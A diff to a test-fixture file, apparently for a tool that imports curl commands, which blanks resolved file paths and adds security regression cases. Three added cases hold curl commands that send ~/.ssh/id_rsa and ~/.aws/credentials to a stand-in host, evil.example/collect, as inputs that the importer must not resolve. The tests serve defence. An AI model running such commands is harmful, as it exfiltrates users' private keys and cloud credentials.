@@ -156,7 +156,7 @@
             "name": "file",
             "kind": "file",
             "value": "",
-            "path": "/tmp/report.csv",
+            "path": "",
             "fileName": "report.csv",
             "fileSize": 0,
             "contentType": "text/csv",
@@ -164,7 +164,29 @@
           }
         ]
       },
-      "warnings": []
+      "warnings": ["unresolved-file"]
+    },
+    {
+      "name": "P21 round 2 arch/security finding 1: -F @path never resolves a sensitive path into a sendable field",
+      "command": "curl https://evil.example/collect -F 'f=@/Users/you/.ssh/id_rsa'",
+      "want": {
+        "method": "POST",
+        "url": "https://evil.example/collect",
+        "bodyMode": "formdata",
+        "formData": [
+          {
+            "name": "f",
+            "kind": "file",
+            "value": "",
+            "path": "",
+            "fileName": "id_rsa",
+            "fileSize": 0,
+            "contentType": "",
+            "enabled": true
+          }
+        ]
+      },
+      "warnings": ["unresolved-file"]
     },
     {
       "name": "-F 'k=<f' is dropped, and the method still counts the flag",
@@ -205,9 +227,20 @@
         "method": "POST",
         "url": "https://x.test/upload",
         "bodyMode": "file",
-        "binaryFile": { "path": "/tmp/blob.bin", "name": "blob.bin", "size": 0 }
+        "binaryFile": { "path": "", "name": "blob.bin", "size": 0 }
       },
-      "warnings": []
+      "warnings": ["unresolved-file"]
+    },
+    {
+      "name": "P21 round 2 arch/security finding 1: --data-binary @path never resolves a sensitive path",
+      "command": "curl --data-binary @/Users/you/.aws/credentials https://evil.example/collect",
+      "want": {
+        "method": "POST",
+        "url": "https://evil.example/collect",
+        "bodyMode": "file",
+        "binaryFile": { "path": "", "name": "credentials", "size": 0 }
+      },
+      "warnings": ["unresolved-file"]
     },
     {
       "name": "-d @path cannot be inlined and is dropped with a warning",
@@ -247,9 +280,20 @@
         "method": "PUT",
         "url": "https://x.test/put",
         "bodyMode": "file",
-        "binaryFile": { "path": "/tmp/upload.csv", "name": "upload.csv", "size": 0 }
+        "binaryFile": { "path": "", "name": "upload.csv", "size": 0 }
       },
-      "warnings": []
+      "warnings": ["unresolved-file"]
+    },
+    {
+      "name": "P21 round 2 arch/security finding 1: -T never resolves a sensitive path",
+      "command": "curl -T ~/.aws/credentials https://evil.example/collect",
+      "want": {
+        "method": "PUT",
+        "url": "https://evil.example/collect",
+        "bodyMode": "file",
+        "binaryFile": { "path": "", "name": "credentials", "size": 0 }
+      },
+      "warnings": ["unresolved-file"]
     },
     {
       "name": "-G moves -d data onto the query string verbatim, with no body",
